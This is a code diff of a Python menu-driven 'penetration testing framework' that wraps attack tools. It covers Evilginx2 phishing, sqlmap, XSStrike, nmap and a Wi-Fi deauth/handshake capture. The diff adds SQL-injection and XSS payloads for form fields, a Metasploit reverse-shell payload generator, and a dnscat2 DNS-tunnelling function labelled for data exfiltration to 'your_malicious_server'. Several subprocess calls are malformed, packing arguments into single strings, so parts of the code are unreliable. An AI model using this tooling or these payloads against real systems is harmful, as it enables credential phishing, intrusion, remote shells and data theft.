@@ -5,7 +5,9 @@ import sys
 import asyncio
 import aiohttp
 import json
-from datetime import datetime
+from zapv2 import ZAPv2  # OWASP ZAP Python library
+import requests
+from bs4 import BeautifulSoup
 
 # Define tool checks
 def check_tool(tool_name):
@@ -19,33 +21,13 @@ def check_tool(tool_name):
 # Banner for the framework
 def display_splash_screen():
     splash = """
- _____________________  ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
-\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
- |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
- |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
- |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
-                 /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
-                                                     _:_
-                                                    '-.-'
-                                           ()      __.'.__
-                                        .-:--:-.  |_______|
-                                 ()      \____/    \=====/
-                                 /\      {====}     )___(
-                      (\=,      //\\      )__(     /_____\
-      __    |'-'-'|  //  .\    (    )    /____\     |   |
-     /  \   |_____| (( \_  \    )__(      |  |      |   |
-     \__/    |===|   ))  `\_)  /____\     |  |      |   |
-    /____\   |   |  (/     \    |  |      |  |      |   |
-     |  |    |   |   | _.-'|    |  |      |  |      |   |
-     |__|    )___(    )___(    /____\    /____\    /_____\
-    (====)  (=====)  (=====)  (======)  (======)  (=======)
-   (______)(_______)(_______)(________)(________)(_________)
-   
- 
-"""
+
+
+
+    """
 
     print(splash)
-    print("Penetration Testing Framework 41PH4-01\n")
+    print("PT Framework 41PH4-01\n")
 
 # Tools and their commands
 TOOLS = {
@@ -74,77 +56,125 @@ def check_tools():
     else:
         print("All tools are installed and ready!")
 
-# Phishing Campaign with Evilginx2
-def phishing_campaign(report_file):
+# Website testing using OWASP ZAP for vulnerabilities
+zap = ZAPv2()
+
+def scan_forms(url):
+    print(f"[*] Scanning forms and hidden fields on {url} using OWASP ZAP...")
+    
+    zap.spider.scan(url)
+    while int(zap.spider.status()) < 100:
+        print(f"[*] Spidering: {zap.spider.status()}% complete...")
+    
+    print("[*] Spidering complete. Scanning for vulnerabilities...")
+    zap.ascan.scan(url)
+    
+    while int(zap.ascan.status()) < 100:
+        print(f"[*] Active scanning: {zap.ascan.status()}% complete...")
+
+    print("[*] Active scanning complete. Checking findings...")
+    
+    alerts = zap.core.alerts(baseurl=url, start=0, count=10)
+    for alert in alerts:
+        print(f"Alert: {alert['alert']} - Risk: {alert['risk']}")
+    
+    print("[*] Vulnerability scanning complete.")
+
+def log_report(report_file, message):
+    with open(report_file, "a") as f:
+        f.write(message + "\n")
+        print(message)
+
+def test_form_fields(url, report_file):
+    print(f"[*] Testing form fields on {url} for injection attacks...")
+    
+    payloads = ["' OR 1=1 --", "<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
+    
+    response = requests.get(url)
+    form_fields = extract_form_fields(response.text)
+    
+    for field in form_fields:
+        for payload in payloads:
+            print(f"[*] Testing {field} with payload: {payload}")
+            data = {field: payload}
+            response = requests.post(url, data=data)
+            
+            if "error" in response.text or payload in response.text:
+                log_report(report_file, f"Injection vulnerability found in {field} using payload: {payload}")
+
+def extract_form_fields(page_source):
+    soup = BeautifulSoup(page_source, 'html.parser')
+    form_fields = [input.get('name') for input in soup.find_all('input') if input.get('name')]
+    return form_fields
+
+def website_vulnerability_testing():
+    print("\n[+] Website Vulnerability Testing")
+    print("1. SQL Injection")
+    print("2. XSS Testing")
+    print("3. OWASP Top 10 Testing (Forms & Hidden Fields)")
+    print("4. Go Back")
+    
+    choice = input("Select an option: ")
+    if choice == '1':
+        url = input("[*] Enter the URL for SQL Injection testing: ")
+        sql_injection(url)
+    elif choice == '2':
+        url = input("[*] Enter the URL for XSS testing: ")
+        test_xss(url)
+    elif choice == '3':
+        url = input("[*] Enter the URL for OWASP Top 10 testing: ")
+        report_file = "penetration_testing_report.txt"
+        scan_forms(url)
+    elif choice == '4':
+        return
+    else:
+        print("Invalid choice. Please select a valid option.")
+
+def phishing_campaign():
     print("[*] Starting Phishing Campaign with Evilginx2...")
-    result = subprocess.run(["evilginx2", "launch"], capture_output=True, text=True)
-    append_to_report(result, report_file)
+    subprocess.run(["evilginx2", "launch"])
 
-# SQL Injection with sqlmap
-def sql_injection(url, report_file):
+def sql_injection(url):
     print(f"[*] Running SQL Injection Test on {url}")
-    result = subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"], capture_output=True, text=True)
-    append_to_report(result, report_file)
+    subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])
 
-# XSS Testing with XSStrike
-def test_xss(url, report_file):
+def test_xss(url):
     print(f"[*] Running XSS Testing on {url}")
-    result = subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"], capture_output=True, text=True)
-    append_to_report(result, report_file)
+    subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])
 
-# Network Scanning with Nmap
-def network_scan(target, report_file):
+def network_scan(target):
     print(f"[*] Running Network Scan on {target}")
-    result = subprocess.run([TOOLS['nmap'], target], capture_output=True, text=True)
-    append_to_report(result, report_file)
+    subprocess.run([TOOLS['nmap'], target])
 
-# Wi-Fi Deauth Attack with aircrack-ng (captures handshake and attempts to crack key)
-def wifi_attack(interface, report_file):
+def wifi_attack(interface):
     print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
     subprocess.run(["airmon-ng", "start", interface])
-    print(f"[*] Capturing handshake on {interface}...")
-    result = subprocess.run(["airodump-ng", interface, "--write", "capture"], capture_output=True, text=True)
-    append_to_report(result, report_file)
-    
-    # Assuming we have captured the handshake in "capture-01.cap"
-    print("[*] Attempting to crack WPA key using aircrack-ng...")
-    result = subprocess.run(["aircrack-ng", "capture-01.cap", "-w", "/path/to/wordlist.txt"], capture_output=True, text=True)
-    append_to_report(result, report_file)
+    subprocess.run(["airodump-ng", interface])
 
-# Generate a snazzy report
-def append_to_report(result, report_file):
-    with open(report_file, 'a') as f:
-        f.write(f"\n{'='*80}\n")
-        f.write(f"Test Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write(f"Output:\n{result.stdout}\n")
-        if result.stderr:
-            f.write(f"Errors:\n{result.stderr}\n")
-        f.write(f"{'='*80}\n")
+def metasploit_payload():
+    print("[*] Generating Metasploit payload...")
+    subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])
 
-# Subdomain Enumeration using custom script
 async def fetch(session, url):
-    """Fetch data from a URL."""
     async with session.get(url) as response:
         return await response.text()
 
 async def get_subdomains(domain):
-    """Get subdomains from public sources."""
     subdomains = set()
     urls = [
         f"https://crt.sh/?q={domain}&output=json",
         f"https://api.hackertarget.com/hostsearch/?q={domain}"
     ]
-
     async with aiohttp.ClientSession() as session:
         tasks = [fetch(session, url) for url in urls]
         responses = await asyncio.gather(*tasks)
 
         for response in responses:
-            if response.startswith('['):  # JSON response from crt.sh
+            if response.startswith('['):  
                 json_response = json.loads(response)
                 for item in json_response:
                     subdomains.add(item['name_value'])
-            else:  # Plain text response from hackertarget
+            else:  
                 lines = response.split('\n')
                 for line in lines:
                     if line:
@@ -152,91 +182,50 @@ async def get_subdomains(domain):
 
     return list(subdomains)
 
-def run_subdomain_enum(domain, report_file):
-    print(f"[*] Running Subdomain Enumeration for {domain}")
+def subdomain_enum(domain):
+    print(f"[*] Enumerating subdomains for {domain}...")
     subdomains = asyncio.run(get_subdomains(domain))
-    result = "\n".join(subdomains)
-    append_to_report(result, report_file)
+    print(f"Found subdomains: {subdomains}")
 
-# Main Menu System
-def main_menu():
-    while True:
-        print("\n[+] Penetration Testing Framework")
-        print("1. Website Vulnerability Testing")
-        print("2. Wi-Fi Cracking")
-        print("3. Subdomain Enumeration")
-        print("4. Network Scanning")
-        print("5. Exit")
-        
-        choice = input("Select an option: ")
-        
-        if choice == '1':
-            website_testing_menu()
-        elif choice == '2':
-            wifi_cracking_menu()
-        elif choice == '3':
-            subdomain_enum_menu()
-        elif choice == '4':
-            network_scan_menu()
-        elif choice == '5':
-            print("Exiting...")
-            sys.exit()
-        else:
-            print("Invalid choice. Please select a valid option.")
+def dns_tunneling():
+    print("[*] Starting DNS Tunneling for Data Exfiltration...")
+    subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])
 
-# Website Testing Menu
-def website_testing_menu():
-    print("\n[+] Website Vulnerability Testing")
-    print("1. SQL Injection")
-    print("2. XSS Testing")
-    print("3. Go Back")
-    
-    choice = input("Select an option: ")
-    if choice == '1':
-        url = input("[*] Enter the URL for SQL Injection testing: ")
-        report_file = "penetration_testing_report.txt"
-        sql_injection(url, report_file)
-    elif choice == '2':
-        url = input("[*] Enter the URL for XSS testing: ")
-        report_file = "penetration_testing_report.txt"
-        test_xss(url, report_file)
-    elif choice == '3':
-        return
-    else:
-        print("Invalid choice. Please select a valid option.")
+def log_results(report_file, message):
+    with open(report_file, "a") as file:
+        file.write(message + "\n")
+        print(message)
 
-# Wi-Fi Cracking Menu
-def wifi_cracking_menu():
-    print("\n[+] Wi-Fi Cracking")
-    print("1. Start Deauth Attack and Cracking")
-    print("2. Go Back")
-    
-    choice = input("Select an option: ")
-    if choice == '1':
-        interface = input("[*] Enter your Wi-Fi interface (e.g., wlan0): ")
-        report_file = "penetration_testing_report.txt"
-        wifi_attack(interface, report_file)
-    elif choice == '2':
-        return
-    else:
-        print("Invalid choice. Please select a valid option.")
-
-# Subdomain Enumeration Menu
-def subdomain_enum_menu():
-    print("\n[+] Subdomain Enumeration")
-    domain = input("[*] Enter the domain to enumerate: ")
-    report_file = "penetration_testing_report.txt"
-    run_subdomain_enum(domain, report_file)
-
-# Network Scanning Menu
-def network_scan_menu():
-    print("\n[+] Network Scanning")
-    target = input("[*] Enter target IP or network to scan: ")
-    report_file = "penetration_testing_report.txt"
-    network_scan(target, report_file)
-
-# Start the script
-if __name__ == "__main__":
+def main():
     display_splash_screen()
     check_tools()
-    main_menu()
+
+    print("[*] Welcome to the Complete Penetration Testing Framework!")
+    print("[*] Please choose an option:")
+    print("1. Website Vulnerability Testing")
+    print("2. Wi-Fi Cracking")
+    print("3. Subdomain Enumeration")
+    print("4. Network Scanning")
+    print("5. Exit")
+
+    choice = input("Enter your choice: ")
+
+    if choice == "1":
+        website_vulnerability_testing()
+    elif choice == "2":
+        interface = input("[*] Enter interface for Wi-Fi deauth (e.g., wlan0): ")
+        wifi_attack(interface)
+    elif choice == "3":
+        domain = input("[*] Enter domain for subdomain enumeration: ")
+        subdomain_enum(domain)
+    elif choice == "4":
+        target_ip = input("[*] Enter target IP for Nmap scan: ")
+        network_scan(target_ip)
+    elif choice == "5":
+        print("[*] Exiting...")
+        exit()
+    else:
+        print("[!] Invalid choice!")
+
+if __name__ == "__main__":
+    main()
